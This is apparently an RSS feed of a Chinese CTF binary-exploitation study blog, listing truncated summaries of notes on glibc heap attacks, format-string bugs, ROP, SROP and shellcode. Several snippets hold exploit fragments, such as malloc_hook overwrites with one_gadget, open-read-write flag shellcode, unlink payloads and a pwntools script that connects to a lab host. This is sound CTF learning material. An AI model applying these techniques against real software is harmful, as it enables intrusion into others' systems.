<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>PWN1s on ZER0-Blog</title><link>/pwn1/</link><description>Recent content in PWN1s on ZER0-Blog</description><generator>Hugo</generator><language>zh-CN</language><lastBuildDate>Sun, 28 Jul 2024 00:00:00 +0000</lastBuildDate><atom:link href="/pwn1/rss.xml" rel="self" type="application/rss+xml"/><item><title>AE64</title><link>/pwn1/shellcode/ae64/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/shellcode/ae64/</guid><description>AE64 AE64 is a tool which can transform any amd64 architecture shellcode into pure alphanumeric shellcode using self-modify code technology, so the page need to be writable.
Install git clone https://github.com/veritas501/ae64.git --depth 1 cd ae64 sudo python3 setup.py install Usage For usage example, you can see example folder.
Quickstart from ae64 import AE64 from pwn import * context.arch=&amp;#39;amd64&amp;#39; # get bytes format shellcode shellcode = asm(shellcraft.sh()) # get alphanumeric shellcode enc_shellcode = AE64().</description></item><item><title>basic</title><link>/pwn1/format_string/basic/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/format_string/basic/</guid><description>[TOC] 写入的字节数 但是写入4字节，也就是32位一般会太大不让写，所以一般都写入2字节 %n的理解 要利用%k$n这个特性，%n的特性：不输出字符，但</description></item><item><title>basic skills</title><link>/pwn1/%E5%A0%86/basic-skills/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86/basic-skills/</guid><description>[TOC] 各个bin的大小 以下皆为chunk的大小： fastbin:0x20-0x80 smallbin:&amp;lt;=0x3f0 largebin:&amp;gt;=0x400 tcache:0x20-0x410 unlink unlink 的目的是把一个双向链表中的空闲块拿出来（例如 free 时和目前物理相邻的 free chunk 进行合并）比如当</description></item><item><title>basic_shellcode</title><link>/pwn1/shellcode/basic_shellcode/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/shellcode/basic_shellcode/</guid><description>[TOC] 注意架构 通常情况下，pwntools 会根据您的操作系统和系统架构来自动选择合适的默认架构。如果您在64位操作系统上运行 pwntools，它</description></item><item><title>csu_init</title><link>/pwn1/stackoverflow/csu_init/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/stackoverflow/csu_init/</guid><description>[TOC] 代码部分 csu_front_addr csu_end_addr 注意不要add rsp,8 function应当是所要调用的函数在栈或bss段上的地址，这样call [r12+rbx*8]才能正确，因为要</description></item><item><title>ctypes</title><link>/pwn1/others/ctypes/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/others/ctypes/</guid><description>用python中的库实现C from pwn import * from ctypes import * from pwnlib.util.packing import p64 p = remote(&amp;#39;10.131.194.201&amp;#39;,59746) LIBC = CDLL(&amp;#39;libc.so.6&amp;#39;) seed = LIBC.time(0) LIBC.srand(seed) x = LIBC.rand() payload = str(x).encode() p.sendline(payload) p.interactive()</description></item><item><title>dbg小技巧</title><link>/pwn1/dbg%E5%B0%8F%E6%8A%80%E5%B7%A7/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/dbg%E5%B0%8F%E6%8A%80%E5%B7%A7/</guid><description>fp tls disass search -p, &amp;ndash;pointer Search for a pointer-width integer ROPgadget &amp;ndash;binary libc-2.32.so | grep &amp;lsquo;mov rdx, qword ptr [rdi + 8]&amp;rsquo; ROPgadget &amp;ndash;binary libc-2.32.so | grep &amp;lsquo;rdx.*rdi&amp;rsquo; 搜索包含同时出现rdx和rdi寄存器的指令 .*是一个正则表达式，表示匹配任意字符零</description></item><item><title>decrypt safe unlink</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBtcache/decrypt-safe-unlink/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBtcache/decrypt-safe-unlink/</guid><description>[TOC] 这篇博客已经讲的很详细了 与libc2.31有些许不同的地方就是libc2.32多加了对next域的限制，稍作修改即可 代码 from pwn import * from pwnlib.util.packing import p64 from</description></item><item><title>dynamic sections</title><link>/pwn1/stackoverflow/dynamic-sections/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/stackoverflow/dynamic-sections/</guid><description>[TOC] Global Offset Table GOT 表在 ELF 文件中分为两个部分： .got，存储导入变量的地址。 .got.plt，存储导入函数的地址。 在 Linux 的实现中，.got.plt 的前三</description></item><item><title>exit</title><link>/pwn1/%E5%A0%86%E6%9D%82%E8%AE%B0/exit/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%9D%82%E8%AE%B0/exit/</guid><description>[TOC] exit_hook攻击 ​glibc-2.34​ 后失效 区分_exit()与exit() _exit()就是一个简单的系统调用syscall #include &amp;lt;unistd.h&amp;gt;</description></item><item><title>fastbin attack</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BB%E6%97%A7%E7%89%88/fastbin-attack/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BB%E6%97%A7%E7%89%88/fastbin-attack/</guid><description>[TOC] 核心： 1.存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞 2.漏洞发生于 fastbin 类型的 chunk 中 3.fastbin的单项链表结构,fd指针</description></item><item><title>fastbin reverse into tcache</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBtcache/fastbin-reverse-into-tcache/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBtcache/fastbin-reverse-into-tcache/</guid><description>[TOC] 参考博客1 参考博客2 低版本 在2.27-2.31版本中，没有对fd指针加密，所以在利用的时候非常简单，只需要将tcache填满，然后放7个c</description></item><item><title>fastbin错位构造</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BB%E6%97%A7%E7%89%88/fastbin%E9%94%99%E4%BD%8D%E6%9E%84%E9%80%A0/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BB%E6%97%A7%E7%89%88/fastbin%E9%94%99%E4%BD%8D%E6%9E%84%E9%80%A0/</guid><description>通过错位构造\x7f可以得到malloc_hook edit(0x10,p64(libc.sym[&amp;#39;__malloc_hook&amp;#39;]-0x23)) add(0x68,b&amp;#34;A&amp;#34;*8) add(0x68,b&amp;#34;\x00&amp;#34;*0x13 + p64(one_gadget))</description></item><item><title>fmtstr_payload</title><link>/pwn1/format_string/fmtstr_payload/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/format_string/fmtstr_payload/</guid><description>[TOC] 适用情况 这个工具只适用于栈上的格式化字符串，可以参考offset变量的设置要求 这个工具写入的数据直接是一个size_t类型，所以如果限制输</description></item><item><title>hijackgot</title><link>/pwn1/stackoverflow/hijackgot/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/stackoverflow/hijackgot/</guid><description>我们知道每次调用外部函数，我们必定会到GOT表中查询外部函数的真实地址，那么如果我们能将GOT中外部函数的地址修改为我们的目标函数，就可以实</description></item><item><title>house of apple1</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-apple1/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-apple1/</guid><description>[TOC] 参考博客 house of apple1 需要和其他方法结合而进行后续的FSOP利用 _IO_wstrn_jumps 前言 利用条件 使用house of apple的条件为： 1、程序从main函数返回或能调</description></item><item><title>house of apple2</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-apple2/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-apple2/</guid><description>[TOC] 参考博客 house of apple2可以在只劫持_wide_data的条件下控制程序的执行流!!! fp的vtable覆盖为_IO_wxxx_jumps</description></item><item><title>house of botcake</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBtcache/house-of-botcake/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBtcache/house-of-botcake/</guid><description>house of botcake 可以看看这篇文章 house of botcake一般都会配合tcache poison一起打 打tcache poison时如果限制了malloc的chu</description></item><item><title>house of cat</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-cat/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-cat/</guid><description>[TOC] 参考博客 参考博客 house of cat在_IO_switch_to_wget_mode可以设置rdx,随后调用setcontent+61可以直接进行o</description></item><item><title>house of emma</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-emma/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-emma/</guid><description>[TOC] 参考文章 例题详解 _IO_cookie_jumps中的_IO_cookie_write，_IO_cookie_write又会调用 cookie_io_functions_t __io_</description></item><item><title>house of husk</title><link>/pwn1/%E5%A0%86%E6%9D%82%E8%AE%B0/house-of-husk/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%9D%82%E8%AE%B0/house-of-husk/</guid><description>参考博客1 参考博客2 效果是执行一次call，一般都是打ogg 这个spec对应的字符对应的偏移就是其ASCII码 漏洞原理 ​printf​ 函数通</description></item><item><title>house of kiwi</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-kiwi/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-kiwi/</guid><description>[TOC] 参考文章 例题讲解 例题讲解 _IO_file_jumps中的_IO_file_sync 前言 加沙盒的题目,在2.29之后的堆题中,通常为以下两种</description></item><item><title>house of orange</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-orange/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-orange/</guid><description>[TOC] 参考博客 攻击分析 修改top chunk的size，然后add一个大于top chunk size的chunk让top chunk进入unsorted bin</description></item><item><title>house of orange新理解</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BB%E6%97%A7%E7%89%88/house-of-orange%E6%96%B0%E7%90%86%E8%A7%A3/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BB%E6%97%A7%E7%89%88/house-of-orange%E6%96%B0%E7%90%86%E8%A7%A3/</guid><description>house of orange攻击流程没什么好说的，但笔者之前一直认为就只是把top chunk放入unsorted bin，然后修改unsorted bin的</description></item><item><title>house of pig</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-pig/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-pig/</guid><description>[TOC] 原理详解 题目详解 _IO_str_jumps中的_IO_str_overflow 核心 利用_IO_str_overflow的malloc,me</description></item><item><title>house of pig plus</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-pig-plus/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/house-of-pig-plus/</guid><description>[TOC] 参考博客 当题目中限制了system函数的调用，可以使用此方法进行orw，但是这个方法的前提还是有hook可打 特别之处 IO_str_over</description></item><item><title>io basic knowledge</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/io-basic-knowledge/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/io-basic-knowledge/</guid><description>[TOC] _IO_list_all、 _IO_2_1_stderr、 stderr FSOP FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 FILE 的介绍得知进程内所有的_IO_FILE 结构会使</description></item><item><title>largebin attack</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/largebin-attack/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/largebin-attack/</guid><description>[TOC] 学习时参考的博客 博客1 博客2 往一个地址写入一个堆地址 largebin attack经常用来在堆上伪造FAKE FILE来打IO_FILE 代码 malloc(0x420) #0 malloc(0x20) malloc(0x410) #1 malloc(0x20) free(0) #</description></item><item><title>libc got</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/libc-got/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/libc-got/</guid><description>[TOC] 参考博客 其实没什么特别的，现在主流的打法就是puts函数会调用libc中got.plt的strlen函数，而strlen的got表可以被我</description></item><item><title>libc2.39堆攻击</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/libc2.39%E5%A0%86%E6%94%BB%E5%87%BB/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/libc2.39%E5%A0%86%E6%94%BB%E5%87%BB/</guid><description>打litctf2024的时候遇到了一个libc2.39的堆，还是用house of apple2这个链打，但是有一点不同，这里做一下记录 主要是发现</description></item><item><title>magic gadgets</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/magic-gadgets/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/magic-gadgets/</guid><description>house of apple2 参考博客 libc2.35 3.6 0x16A06A libc2.35 3_ gadget=licbase+0x16A1FA magic_gadget = libc_base + libc.sym[&amp;ldquo;svcudp_reply&amp;rdquo;] + 0x1a 0x7ffff7f092ba &amp;lt;svcudp_reply+26&amp;gt; mov rbp, qword ptr [rdi + 0x48] 0x7ffff7f092be &amp;lt;svcudp_reply+30&amp;gt; mov rax, qword ptr [rbp + 0x18] 0x7ffff7f092c2 &amp;lt;svcudp_reply+34&amp;gt; lea r13, [rbp + 0x10] 0x7ffff7f092c6 &amp;lt;svcudp_reply+38&amp;gt; mov dword ptr [rbp + 0x10], 0 0x7ffff7f092cd &amp;lt;svcudp_reply+45&amp;gt; mov rdi, r13 0x7ffff7f092d0 &amp;lt;svcudp_reply+48&amp;gt; call qword ptr [rax + 0x28] 具体做</description></item><item><title>mp_</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBtcache/mp_/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBtcache/mp_/</guid><description>[TOC] 不能使用tcache -&amp;gt; 通过large_bin attack修改mp_.tcache_bins -&amp;gt; free相应chunk -&amp;gt; 修改tcache的相应</description></item><item><title>mprotect</title><link>/pwn1/stackoverflow/mprotect/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/stackoverflow/mprotect/</guid><description>mprotect可以修改一个区域的权限 void mprotect(void *address, size_t length, int prot); address: 这是要操作的内存区域的起始地址。通常是一个 void 指针，可以指向任何类型的数据。 length: 这是要操作</description></item><item><title>off-by-one</title><link>/pwn1/%E5%A0%86%E6%9D%82%E8%AE%B0/off-by-one/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%9D%82%E8%AE%B0/off-by-one/</guid><description>参考博客 off-by-one确实比off-by-null好打多了 注意off-by-one构造overlapping chunk的时候要使得通过</description></item><item><title>one_gadget</title><link>/pwn1/stackoverflow/one_gadget/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/stackoverflow/one_gadget/</guid><description>ogg</description></item><item><title>orw_plus</title><link>/pwn1/shellcode/orw_plus/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/shellcode/orw_plus/</guid><description>详细内容可以参考这篇文章 贴一个总结的还不错的文章 [TOC] 两种基本orw的shellcode 第一种 ; open(&amp;#34;flag&amp;#34;, 0) push 0x67616c66 push 0x2 pop rax mov rdi,rsp xor rsi,rsi syscall ; read(fd, rsp, 0x50) mov rdi,rax xor rax,rax mov rsi,rsp push</description></item><item><title>partial overwrite</title><link>/pwn1/%E5%A0%86%E6%9D%82%E8%AE%B0/partial-overwrite/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%9D%82%E8%AE%B0/partial-overwrite/</guid><description>[TOC] 程序没有show函数，当堆块被free后，如果还可以edit，那么就可以通过partial overwrite来进行泄露进而爆破申请出想要申</description></item><item><title>personal skills</title><link>/pwn1/%E5%A0%86/personal-skills/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86/personal-skills/</guid><description>注意二级指针，*的作用是解引用，把它想成访问地址又形象又好理解 学会画图很重要 注意malloc的大小和实际开辟的chunk的大小 传给free的</description></item><item><title>printf函数</title><link>/pwn1/others/printf%E5%87%BD%E6%95%B0/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/others/printf%E5%87%BD%E6%95%B0/</guid><description>奇怪的知识点，printf函数会有个判断al的值是否为0的操作来判断是否进行浮点数操作</description></item><item><title>python常用</title><link>/pwn1/python%E5%B8%B8%E7%94%A8/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/python%E5%B8%B8%E7%94%A8/</guid><description>[TOC] fromhex，十六进制字符串转换为字节对象互相转化 &amp;gt;&amp;gt;&amp;gt; bytes([0,1,2,3,4,5]).hex() &amp;#39;000102030405&amp;#39; #fromhex这个中间有空格也不影响 &amp;gt;&amp;gt;&amp;gt; bytes.fromhex(&amp;#39;000102030405&amp;#39;) b&amp;#39;\x00\x01\x02\x03\x04\x05&amp;#39; &amp;gt;&amp;gt;&amp;gt; b&amp;#39;abcde&amp;#39;.hex() &amp;#39;6162636465&amp;#39; &amp;gt;&amp;gt;&amp;gt; a = bytes.fromhex(&amp;#39;6162636465&amp;#39;) b&amp;#39;abcde&amp;#39; 切片操作，这个很常用</description></item><item><title>realloc调整堆栈</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BB%E6%97%A7%E7%89%88/realloc%E8%B0%83%E6%95%B4%E5%A0%86%E6%A0%88/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BB%E6%97%A7%E7%89%88/realloc%E8%B0%83%E6%95%B4%E5%A0%86%E6%A0%88/</guid><description>注意realloc_hook就在malloc_hook-8的位置 # __malloc_hook -&amp;gt; realloc+8 # __realloc_hook -&amp;gt; one_gadget realloc = libc_base + libc.sym[&amp;#39;realloc&amp;#39;] one_gadget = [0x4527a, 0xf03a4, 0xf1247] add(4, 0x68, b&amp;#39;p&amp;#39; * 11 + p64(libc_base + one_gadget[0]) + p64(realloc + 8))</description></item><item><title>ret2dlresolve</title><link>/pwn1/stackoverflow/ret2dlresolve/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/stackoverflow/ret2dlresolve/</guid><description>[TOC] 参考博客 适用于NO RELRO, Partial RELRO，在64位中一般都是打linkmap结构体，板子题 攻击模板 总结地说，我们需要 st_other != 0 l -&amp;gt; l_addr = system_libc - a_libc</description></item><item><title>sandbox</title><link>/pwn1/stackoverflow/sandbox/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/stackoverflow/sandbox/</guid><description>[TOC] sandbox sandbox检测工具 seccomp-tools dump ./file 有时候直接用这个指令没有检测到沙盒，一般是因为程序还没有执行到沙盒，随便输入执行到沙盒就行 prctl函数 可以</description></item><item><title>shellcode网站</title><link>/pwn1/shellcode/shellcode%E7%BD%91%E7%AB%99/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/shellcode/shellcode%E7%BD%91%E7%AB%99/</guid><description>详细阐述了各种shellcode 可以查看各个指令对应的机械码 系统调用号 汇编网站 shellcode库</description></item><item><title>skills</title><link>/pwn1/format_string/skills/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/format_string/skills/</guid><description>[TOC] 一般rsp为相对格式化字符串的第5或6个参数 打ogg只用写入几个字节 返回地址本身就是Libc里面的函数 那么我们写入的时候为了省事其实可以只</description></item><item><title>skills</title><link>/pwn1/skills/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/skills/</guid><description>有read函数最好用send，scanf和gets必须用sendline init函数也要查看，有时候一些变量的初始化就在其中 strlen的绕</description></item><item><title>srop</title><link>/pwn1/stackoverflow/srop/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/stackoverflow/srop/</guid><description>[TOC] 一些重要理解 rsp必须必须指向fake_frame的底部，不然sigreturn无法正常执行 fake_frame中的rip的值就是sigr</description></item><item><title>stack_migration</title><link>/pwn1/stackoverflow/stack_migration/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/stackoverflow/stack_migration/</guid><description>[TOC] 栈迁移 栈迁移的核心是leave_ret指令，要清楚leave_ret指令的作用 栈迁移：rbp覆盖为我们想要转移到的地址-8（注意有个pop</description></item><item><title>stderr</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/stderr/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/stderr/</guid><description>在打IO攻击的时候经常需要用到malloc_assert，要打stderr,这里区分一下几个概念 1.直接打_IO_2_1_stderr_ 如果</description></item><item><title>stdout</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/stdout/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/stdout/</guid><description>[TOC] 遇到puts或printf，就会将_IO_write_base指向的内容打印出来。实际操作中发现如果是write函数还不行 stdout原理</description></item><item><title>summary</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/summary/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBio_file/summary/</guid><description>[TOC] house系列 house系列的致命缺陷就是vtable是通过偏移调用函数 这种找vtable要根据源码去libc.so.6里面进行对比查找，</description></item><item><title>system_execve函数</title><link>/pwn1/others/system_execve%E5%87%BD%E6%95%B0/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/others/system_execve%E5%87%BD%E6%95%B0/</guid><description>[TOC] system函数 system(&amp;quot;$0&amp;quot;) system(&amp;ldquo;sh&amp;rdquo;) system(&amp;quot;/bin/sh&amp;quot;) system(&amp;quot;/bin//sh&amp;quot;)都可以拿到shell cat *：是一个在命令行中使用的Unix/L</description></item><item><title>tcache stashing unlink attack</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBtcache/tcache-stashing-unlink-attack/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBtcache/tcache-stashing-unlink-attack/</guid><description>[TOC] 学习时参考的博客 一篇讲原理的博客 例题博客 例题博客 例题博客 1.获得任意地址target_addr的控制权 2.在任意地址target_addr</description></item><item><title>tcache_perthread_struct</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBtcache/tcache_perthread_struct/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBtcache/tcache_perthread_struct/</guid><description>[TOC] tcache_perthread_struct可以free掉，在libc2.30以下的版本tcache_perthread_struct大</description></item><item><title>templates</title><link>/pwn1/templates/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/templates/</guid><description>[TOC] recv canary=int(sh.recvuntil(b&amp;quot;00&amp;quot;).decode(),16) buffer= int(p.recv(14), 16) 两个十六进制是一个字节，但是printf函数打印是一个字符一个字符的打印，一个字符是一个字节，所以0x7ffec1484618也</description></item><item><title>tls</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBtcache/tls/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBtcache/tls/</guid><description>[TOC] 参考文章 对于tcache 修改线程tcache变量 在tls区域，有一个线程变量tcache，如果能用largebin attack修改tcac</description></item><item><title>tricks</title><link>/pwn1/shellcode/tricks/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/shellcode/tricks/</guid><description>常用系统调用号 syscall 64位 0-&amp;gt;read 1-&amp;gt;write 2-&amp;gt;open 5-&amp;gt;fstat 9-&amp;gt;mmap 0xa-&amp;gt;mprotect 0xf-&amp;gt;rt_sigreturn 0x3b-&amp;gt;execve 0x5a-&amp;gt;chmod int 0x80 32位 3-&amp;gt;read 4-&amp;gt;write 5-&amp;gt;open 0xb-&amp;gt;execve 有时候受字长限制可以考虑eax,ax,al这种寄存器,让shellcode变短 cd</description></item><item><title>tricks</title><link>/pwn1/tricks/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/tricks/</guid><description>[TOC] 做题步骤 第一步先checksec(checksec至关重要，因为如果partial rello那么很可能会打got，然后no pie这种很可能</description></item><item><title>uaf</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBtcache/uaf/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BBtcache/uaf/</guid><description>[TOC] UAF不仅可以泄露，还能让两个指针指向同一个chunk 题目分析 巅峰极客2022 happy_note libc2.35 add大小要&amp;lt;=0x200，add时无read。然</description></item><item><title>unsafe unlink</title><link>/pwn1/%E5%A0%86%E6%9D%82%E8%AE%B0/unsafe-unlink/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%9D%82%E8%AE%B0/unsafe-unlink/</guid><description>[TOC] 核心 这个技巧适用于no pie的情况下使用 chunk 0 ptr store in &amp;amp;ptr malloc(0x420) # not in fastbin or tcache malloc(0x420) edit(0, p64(0)+p64(fake_size)+p64(&amp;amp;ptr-0x18)+p64(&amp;amp;ptr-0x10)+p64(0)*k + p64(fake_prev_size)+p64(size)) # fakesize = 0x430-0x10 限制: overflow ,可以修改prev_inuse触发fake chunk unlink</description></item><item><title>unsorted bin attack</title><link>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BB%E6%97%A7%E7%89%88/unsorted-bin-attack/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%94%BB%E5%87%BB%E6%97%A7%E7%89%88/unsorted-bin-attack/</guid><description>[TOC] 1.unsorted bin attack 被利用的前提是控制 unsorted bin chunk 的 bk 指针或者有show函数。 2.unsorted bin attack的目的一般是为别的attack做准备，比如可以通过main_ar</description></item><item><title>保护机制变动</title><link>/pwn1/%E5%A0%86/%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%8F%98%E5%8A%A8/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86/%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E5%8F%98%E5%8A%A8/</guid><description>一篇讲这个的博客 house系列 tcachebin 堆指针异或加密（glibc-2.32 引入） fastbin 堆指针异或加密（glibc-2.32 引入） 堆内存对齐检查（gli</description></item><item><title>打法总述</title><link>/pwn1/%E5%A0%86/%E6%89%93%E6%B3%95%E6%80%BB%E8%BF%B0/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86/%E6%89%93%E6%B3%95%E6%80%BB%E8%BF%B0/</guid><description>[TOC] 打法总述 笔者对于这些攻击手法感觉不是很难，难的地方在于堆风水 有无off-by-null 一般没有uaf都是会有off-by-null可以利用</description></item><item><title>低版本off-by-null</title><link>/pwn1/%E5%A0%86%E6%9D%82%E8%AE%B0/%E4%BD%8E%E7%89%88%E6%9C%ACoff-by-null/</link><pubDate>Sun, 28 Jul 2024 00:00:00 +0000</pubDate><guid>/pwn1/%E5%A0%86%E6%9D%82%E8%AE%B0/%E4%BD%8E%E7%89%88%E6%9C%ACoff-by-null/</guid><description>off-by-null 利用思路 溢出字节为可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法 